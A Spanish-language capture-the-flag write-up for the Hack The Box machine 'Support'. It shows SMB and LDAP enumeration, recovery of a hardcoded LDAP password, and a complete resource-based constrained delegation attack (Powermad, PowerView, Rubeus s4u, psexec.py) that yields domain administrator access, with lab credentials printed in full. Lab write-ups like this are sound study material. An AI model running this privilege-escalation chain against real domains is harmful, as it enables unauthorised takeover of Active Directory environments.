---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Support

`Support` es una máquina Windows de dificultad Fácil que cuenta con un recurso compartido `SMB` que permite la autenticación anónima. Después de conectarse al recurso compartido, se descubre un archivo ejecutable que se utiliza para consultar al `servidor LDAP` de la máquina los usuarios disponibles.&#x20;

A través de ingeniería inversa, análisis de red o emulación, se identifica la contraseña que utiliza el binario para vincular el servidor `LDAP` y se puede utilizar para realizar más consultas `LDAP`. Se identifica un usuario llamado `support` en la lista de usuarios y se descubre que el campo `info` contiene su contraseña, lo que permite una conexión WinRM a la máquina. Una vez en la máquina, se puede recopilar información del dominio a través de `SharpHound` y `BloodHound` revela que el grupo `Shared Support Accounts` del que es miembro el usuario `support` tiene privilegios `GenericAll` en el controlador de dominio. Se realiza un ataque de delegación restringida basada en recursos y se recibe un shell como `NT Authority\System`.

<figure><img src="../../../../../.gitbook/assets/Support.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina Support.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.174 -oG allPorts
```

<figure><img src="../../../../../.gitbook/assets/846_vmware_J7CoTyUhgw.png" alt=""><figcaption></figcaption></figure>

Lanzaremos una serie de scripts básicos para intentar buscar vulnerabilidades en los puertos que hemos encotrado expuestos.

{% code overflow="wrap" %}
```bash
nmap -sCV -p53,88,135,139,445,464,593,636,3268,3269,5985,9389,49664,49667,49674,49686,49691,49712 10.10.11.174 -oN targeted
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/847_vmware_VGoSSD0cUv.png" alt=""><figcaption></figcaption></figure>

Comprobaremos el nombre del dominio con el cual nos enfrentamos a través del siguiente comando.

```bash
ldapsearch -x -H ldap://10.10.11.174 -s base | grep defaultNamingContext
```

<figure><img src="../../../../../.gitbook/assets/848_vmware_EmCBZKlkCH.png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir la entrada en nuestro archivo **/etc/hosts**

```bash
catnp /etc/hosts | grep support.htb
```

<figure><img src="../../../../../.gitbook/assets/849_vmware_hGbzpEW7tx.png" alt=""><figcaption></figcaption></figure>

## SMB Enumeration

Procederemos a enumerar el servicio de SMB que hemos encontrado expuesto. Probaremos de listar los recursos compartidos para ver que encontramos. Nos descargaremos todo el contenido

```bash
smbclient -L 10.10.11.174 -N 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/850_vmware_vv1edduxq3.png" alt=""><figcaption></figcaption></figure>

Procederemos a conectarnos al recurso compartido (support-tools) y nos descargaremos todo el contenido del recurso compartido a nuestro equipo local.

```bash
smbclient //10.10.11.174/support-tools -N
```

<figure><img src="../../../../../.gitbook/assets/851_vmware_BhygiuChI0.png" alt=""><figcaption></figcaption></figure>

## EXE Binary Analysis

Comprobamos que entre los archivos que hemos descargado

```
mono UserInfo.exe
```

<figure><img src="../../../../../.gitbook/assets/852_vmware_glYlWgPtmP.png" alt=""><figcaption></figcaption></figure>

### Debugging with DNSpy

Primero de todo, procederemos a pasarnos el .exe a un equipo Windows para analizarlo con la siguiente herramienta [DNSpy](https://dnspy.co/).

Abriremos el binario en la aplicación mencionada y iremos investigando como funciona por debajo la aplicación que hemos encontrado. Nos damos cuenta que en el archivo "LdapQuery" parece que se obtiene una contraseña a través de la función **getPassword()** del archivo **Protected** en el cual se utiliza el usuario parece ser (**support\ldap**).

<figure><img src="../../../../../.gitbook/assets/853_vmware_gJb6W2kDRx.png" alt=""><figcaption></figcaption></figure>

Accediendo al contenido del archivo **Protected** nos damos cuenta que se envía una contraseña encodeada.

<figure><img src="../../../../../.gitbook/assets/854_vmware_waOsPoq4eQ.png" alt=""><figcaption></figcaption></figure>

Volveremos al archivo de **LdapQuery** y haremos un _breakpoint_ en el punto indicado y debuguearemos pasándole argumentos para la ejecución del programa.

<figure><img src="../../../../../.gitbook/assets/855_vmware_USmI0raHxb.png" alt="" width="563"><figcaption></figcaption></figure>

Comprobaremos en la zona inferior que obtuvimos una variable nombrada **password** pero no nos aparece ningún contenido. Procederemos a debuguear el programa (Debug < Step Over) para ir al siguiente paso.

<figure><img src="../../../../../.gitbook/assets/856_vmware_9oH9uWqIxv.png" alt=""><figcaption></figcaption></figure>

Comprobamos que al ir al siguiente paso en la variable **password** se almacena un valor que parece ser una contraseña sin encodear.

<figure><img src="../../../../../.gitbook/assets/857_vmware_pCfi5MsuDd.png" alt=""><figcaption></figcaption></figure>

Comprobaremos en nuestra Kali utilizando la herramienta de **netexec** de ver si las credenciales obtenidas son válidas para el usuario **ldap** que es el que aparecía en el código del .exe analizado.

{% code overflow="wrap" %}
```bash
netexec smb 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d htb.local
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/858_vmware_hmagabyKWI.png" alt=""><figcaption></figcaption></figure>

## LDAP Enumeration

### Enumeration with ldapdomaindump

Una de las maneras que disponemos de enumerar el LDAP del servidor es mediante la herramienta de **ldapdomaindump**.

{% code overflow="wrap" %}
```bash
ldapdomaindump -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174 -o ldap
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/859_vmware_DcAi8RddwR.png" alt=""><figcaption></figcaption></figure>

### Enumeration with ldapsearch

Otra de las maneras para enumerar LDAP, es a través del comando **ldapsearch** en el cuál podemos ir enumerando usuario por usuario a través del siguiente comando.

El siguiente comando procederemos a enumerar al usuario "**support**" para ver que información tiene. Nos damos cuenta que en el campo "Info" aparece una cadena de texto que parece inusual, más bien, parace de tratarse de una contraseña.

{% code overflow="wrap" %}
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i "samaccountname: support" -B 40
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/861_vmware_DDjhu1VHrE.png" alt=""><figcaption></figcaption></figure>

### Enumeration with Bloodhound

Una de las mejores maneras de enumerar LDAP es a través de **BloodHound** el cual recolectando toda la información del dominio podemos montarnos una BBDD con todo el dominio y ver que vías potenciales disponemos para escalar privilegios, etc.

Ene ste caso enumeramos des de Bloodhound al usuario "support" y nos damos cuenta que pertenece al grupo de usuarios de gestión remota, es decir "Remote Management Users". Por lo tanto, es un buen indicio que con dicho usuario podemos conectarnos al WinRM que encontramos expuesto a la hora de escanear los puertos con **nmap**.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/860_vmware_6pydFiYk13.png" alt=""><figcaption></figcaption></figure>

## Flag user.txt

Procederemos de validar con **netexec** de que con el usuario **support** y las credenciales encontradas en el campo "Info" de su usuario de LDAP són válidas o no para el acceso al WinRM.

Comprobamos que nos aparece como **Pwn3d**, por lo tanto, comprobamos que son credenciales válidas y además que tenemos acceso al WinRM, ya que si no tuvieramos acceso al WinRM, nos habría salido en \[+] (indicando que las credenciales son válidas), pero no nos hubiera indicado el Pwn3d.

```bash
netexec winrm 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```

<figure><img src="../../../../../.gitbook/assets/862_vmware_OmHQzURr1O.png" alt=""><figcaption></figcaption></figure>

Una vez comprobado que si tenemos acceso, procederemos a conectarnos a la máquina víctima con el usuario "support" y sus respectivas credenciales. Comprobaremos que ganamos acceso y vemos el contenido de la flag de **user.txt**.

{% code overflow="wrap" %}
```bash
evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/863_vmware_HMjtv3jXdn.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Resource-based Constrained Delegation (RBCD Attack)

Procerderemos a enumerar al usuario "support" y comprobar de qué grupos es miembro. Nos damos cuenta que es miembro del grupo "Shared Support Accounts", un grupo un tanto inusual que miraremos de qué trata.

```bash
net group
```

<figure><img src="../../../../../.gitbook/assets/864_vmware_oRVo6xSTfw.png" alt="" width="494"><figcaption></figcaption></figure>

Des de **Bloodhound** buscaremos al grupo "Shared Support Accounts" y en "Node Info" haremos clickl a "Reachable High Value Targets" para intentar ver objetivos alcanzables de alto valor que podamos utilizar para escalar privilegios.

<figure><img src="../../../../../.gitbook/assets/865_vmware_omdWeMwjXv.png" alt=""><figcaption></figcaption></figure>

Comprobamos que existe relación entre el grupo "Shared Support Accounts" y si le damos a "Help" comprobamos que Bloodhound nos indica que todos los miembros de dicho grupo tiene control total sobre el equipo indicado.

<figure><img src="../../../../../.gitbook/assets/869_vmware_D4y3IWVSF7.png" alt=""><figcaption></figcaption></figure>

Si accedemos a "Windows Abuse", Bloodhound nos mostrará unas pautas para intentar explotar la vulnerabilidad (RBCD Attack).

Un ataque de RBCD (Resource-Based Constrained Delegation) se aprovecha de la delegación basada en recursos en entornos de Active Directory para obtener acceso privilegiado. Este tipo de ataque usa la capacidad de un objeto en Active Directory para delegar acceso a otro recurso en el sistema, sin intervención administrativa directa.

En un escenario típico, el atacante compromete una cuenta que puede modificar ciertos atributos, como la propiedad de delegación en un objeto de computadora. Luego, configura ese objeto para que pueda autenticarse como cualquier usuario en un recurso específico, por ejemplo, para obtener el Ticket Granting Ticket (TGT) de una cuenta privilegiada y, así, escalar permisos.

<figure><img src="../../../../../.gitbook/assets/868_vmware_ACLOwoh8nr.png" alt=""><figcaption></figcaption></figure>

Procederemos a realiar la explotación de dicha vulnerabilidad para realizar un escalado de privilegios. Para ello hemos seguido la guía de [**HackTricks** ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation#configuring-resource-based-constrained-delegation)donde lo explica de manera detallada y te muestra que se tiene que realizar.

Primero de todo, en nuestra Kali procederemos a descargarnos el Powermad para pasarlo al equipo que queremos comprometer des de Evil-WinRM.&#x20;

Des del equipo que queremos comprometer, procederemos a subirnos el archivo .ps1, importaremos el módulo y procederemos a realizar el ataque.

Procederemos a crear con **Powermad** un equipo llamado "SERVICEA" y le asignaremos de contraseña '123456'

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1

upload Powermad.ps1
<strong>
</strong><strong>Import-Module .\Powermad.ps1
</strong>
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
</code></pre>

<figure><img src="../../../../../.gitbook/assets/867_vmware_ZMhwWDPSWp.png" alt=""><figcaption></figcaption></figure>

Procederemos a descargarnos PowerView a nuestra Kali, la pasaremos al equipo víctima e importaremos el módulo para tener los comandos disponibles.

{% code overflow="wrap" %}
```powershell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

upload PowerView.ps1

Import-Module .\PowerView.ps1
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/871_vmware_G4sUuKRygT.png" alt=""><figcaption></figcaption></figure>

Comprobaremos que el objeto de ordenador que hemos creado "SERVICEA" se ha creado correctamente. Comprobamos que se ha creado sin problemas y tenemos el SID del objeto, lo cual es su identificador.

```powershell
Get-DomainComputer SERVICEA
```

<figure><img src="../../../../../.gitbook/assets/872_vmware_hW02qBDnFH.png" alt=""><figcaption></figcaption></figure>

Procederemos a realizar lo que nos queda para finalizar el **RCBD Attack**.

Al configurar el atributo `´msds-allowedtoactonbehalfofotheridentity'` en el objeto de ordenador `'SERVICEA'`, le otorgamos la capacidad de actuar en nombre de otros usuarios dentro del controlador de dominio (dc). Este proceso se basa en la delegación de recursos (RBCD), que permite que un equipo pueda solicitar acceso a ciertos recursos como si fuera otro usuario.

Específicamente, al aplicar este cambio, `SERVICEA` obtiene permisos para solicitar un Ticket Granting Ticket (TGT) en nombre de otras cuentas, incluyendo aquellas con permisos elevados. En un entorno de ataque, este TGT permite que `SERVICEA` acceda a servicios o realice acciones en el dominio como si fuera el usuario original, logrando así una impersonación dentro del controlador de dominio.

{% code overflow="wrap" %}
```powershell
$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/873_vmware_Cl05xVxiOb.png" alt=""><figcaption></figcaption></figure>

### Rubeus

En nuestra Kali procederemos a descargarnos el binario de **Rubeus.exe** des de [GitHub](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries). Rubeus lo utilizaremos para solicitar y cargar un ticket de servicio (TGS), lo que permite al atacante utilizar '`SERVICEA'` para actuar como un usuario privilegiado en un recurso determinado.

Utilizaremos el siguiente comando para conseguir el Hash NTLM del equipo `SERVICEA` en el dominio de support.htb, le pasaremos la contraseña que hemos configurado anteriormente al crear el equipo en el dominio. Comprobaremos que obtenemos el hash, el que nos interesa es el de **rc4\_hmac**.

```powershell
upload Rubeus.exe

.\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:support.htb
```

<figure><img src="../../../../../.gitbook/assets/874_vmware_9J0kMFfz5Z.png" alt=""><figcaption></figcaption></figure>

Este comando en `Rubeus` permite realizar una **impersonación de usuario** mediante la función **S4U (Service for User)** en un ataque de delegación basada en recursos (RBCD), utilizando el hash NTLM de la cuenta `SERVICEA$`.

Al ejecutarlo, `Rubeus` solicita un **Ticket Granting Service (TGS)** para el usuario `administrator` en el servicio `cifs` del controlador de dominio (`dc.support.htb`), pero empleando los privilegios de la cuenta `SERVICEA$`. Esto permite que `SERVICEA$` actúe en nombre de `administrator`, logrando así la **impersonación del usuario con privilegios elevados** y proporcionando acceso al controlador de dominio como si fuera `administrator`.

En pocas palabras, este comando usa los permisos de delegación configurados en `SERVICEA$` para operar con los mismos privilegios de `administrator` en el dominio, asegurando un acceso privilegiado a los recursos.

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe s4u /user:SERVICEA$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/876_vmware_WdQj0uxUU0.png" alt="" width="563"><figcaption></figcaption></figure>

Comprobamos que nos otorga el tiquet Kirbi codeado en Base64. Copiaremos el contenido del ticket.

<figure><img src="../../../../../.gitbook/assets/877_vmware_uTdN62fRsv (1).png" alt="" width="538"><figcaption></figcaption></figure>

En nuestra Kali, copiaremos el contenido del ticket en un archivo nombrado "ticket.kirbi.b64". Lo descodificaremos de Base64 y guardaremos el archivo como "ticker.kirbi".

```bash
catnp ticket.kirbi.b64

base64 -d ticket.kirbi.b64 > ticket.kirbi
```

<figure><img src="../../../../../.gitbook/assets/879_vmware_0fEt0sBtso.png" alt="" width="563"><figcaption></figcaption></figure>

Utilizaremos **ticketConverter.py,** este comando convierte un ticket `kirbi` en un `ccache`, lo que permite su uso en diferentes entornos y herramientas que gestionan la autenticación Kerberos.

```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

<figure><img src="../../../../../.gitbook/assets/880_vmware_s0XOfDqWa2.png" alt=""><figcaption></figcaption></figure>

En este comando, establecemos la variable de entorno `KRB5CCNAME` para que apunte al archivo de caché de tickets Kerberos (ticket.ccache), que contiene el ticket que obtuvimos anteriormente. Luego, ejecutamos **psexec.py**, lo que nos permite acceder a la máquina remota usando Kerberos para la autenticación (especificando -k), sin necesidad de proporcionar una contraseña (gracias a -no-pass).

Al especificar `support.htb/administrator@dc.support.htb`, logramos ejecutar comandos en el controlador de dominio con los privilegios del usuario administrator. Esto nos facilita el acceso a recursos y funciones del sistema con permisos elevados, culminando así el ataque RBCD de manera efectiva.

Comprobamos que ganamos acceso finalmente como usuario Administrador y obtenemos la flag de **root.txt**.

{% code overflow="wrap" %}
```bash
KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/882_vmware_gROR0LTpic.png" alt=""><figcaption></figcaption></figure>
